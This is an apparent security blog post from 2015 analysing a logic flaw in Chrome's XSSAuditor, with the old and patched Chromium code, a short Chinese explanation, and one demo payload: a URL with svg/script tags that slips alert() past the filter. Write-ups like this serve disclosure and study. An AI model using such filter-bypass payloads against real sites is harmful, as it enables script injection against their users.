<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Chrome XSS Filter Bypass - 1187843005 - Linux.im</title>
    <meta name="description" content="Hacking for fun. - evi1m0"/>
    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
  </head>
  <body>
    <style>
      h1 {
        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
      }
    </style>
    <div class="site">
      <div class="post-content" style="margin-top: -20px;">
        <div id="post">
          <h1 id="chrome-xss-filter-bypass---1187843005">Chrome XSS Filter Bypass - 1187843005</h1>
<p class="date">24 Jun 2015 - evi1m0</p>

<ul>
  <li>Discovery Date: 16-06-15</li>
  <li>Affected Products: Google Chrome 43.0.2357.124 m (letest stable version)</li>
  <li>Issue: <a href="https://codereview.chromium.org/1187843005/">XSSAuditor: Dont give a pass to subsequent script blocks if first one is empty.</a></li>
  <li>Description: Script bodies are filtered in chunks with the earliest chunk controlling the suppression of subsequent ones.  But we may fail to match if the first chunk can be reduced to an empty string.  Keep looking in that case.</li>
</ul>

<p>/Source/core/html/parser/XSSAuditor.cpp:</p>

<pre><code>Old:

m_state != SuppressingAdjacentCharacterTokens
if ((m_state == SuppressingAdjacentCharacterTokens)
    || (m_scriptTagFoundInRequest &amp;&amp; isContainedInRequest(canonicalizedSnippetForJavaScript(request)))) {
    request.token.eraseCharacters();
    request.token.appendToCharacter(' ');
    m_state = SuppressingAdjacentCharacterTokens;
    return true;
}
m_state = PermittingAdjacentCharacterTokens;

===================

Fix:
if (m_state == FilteringTokens &amp;&amp; m_scriptTagFoundInRequest) {
    String snippet = canonicalizedSnippetForJavaScript(request);
    if (isContainedInRequest(snippet))
        m_state = SuppressingAdjacentCharacterTokens;
    else if (!snippet.isEmpty())
        m_state = PermittingAdjacentCharacterTokens;
}
if (m_state == SuppressingAdjacentCharacterTokens) {
    request.token.eraseCharacters();
    request.token.appendToCharacter(' ');
    return true;
}
</code></pre>

<p>/Source/core/html/parser/XSSAuditor.h:</p>

<pre><code>68  private:
69      static const size_t kMaximumFragmentLengthTarget = 100;
70  
71      enum State {
72          Uninitialized,
73          FilteringTokens,
74          PermittingAdjacentCharacterTokens,
75          SuppressingAdjacentCharacterTokens
76      };
77  
78      enum TruncationKind {
79          NoTruncation,
80          NormalAttributeTruncation,
81          SrcLikeAttributeTruncation,
82          ScriptLikeAttributeTruncation
83      };
84  
85      enum HrefRestriction {
86          ProhibitSameOriginHref,
87          AllowSameOriginHref
88      };
</code></pre>

<p>Demo: </p>

<pre><code>https://localhost/&lt;svg&gt;&lt;script&gt;/&lt;*/&gt;alert()&lt;/script&gt;
</code></pre>

<p>有趣的逻辑漏洞，花了点儿时间追下：</p>

<pre><code>if ((m_state == SuppressingAdjacentCharacterTokens)
|| (m_scriptTagFoundInRequest &amp;&amp; isContainedInRequest(canonicalizedSnippetForJavaScript(request))))
</code></pre>

<p>条件：<code>if((a) || (b &amp;&amp; c))</code></p>

<p>其中 <code>a || b</code> 某一值为 false，则不会给 m_state 赋值 SACT 状态，跟踪变量 m_state 不为 SACT</p>

<p>使条件达成  <code>if (false || (false &amp;&amp; true))</code> 绕过过滤。</p>

        </div>
      </div>

      <div id="disqus_thread"></div>
      <script type="text/javascript">
        var disqus_shortname = 'evi1m0';
        (function() {
          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>
      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

      <!-- footer -->
      <div class="footer">
        <div class="contact">
          <p>
            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
          </p>
        </div>
      </div>
    </div>

    <div style="display: none;">
      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
    </div>
  </body>
</html>
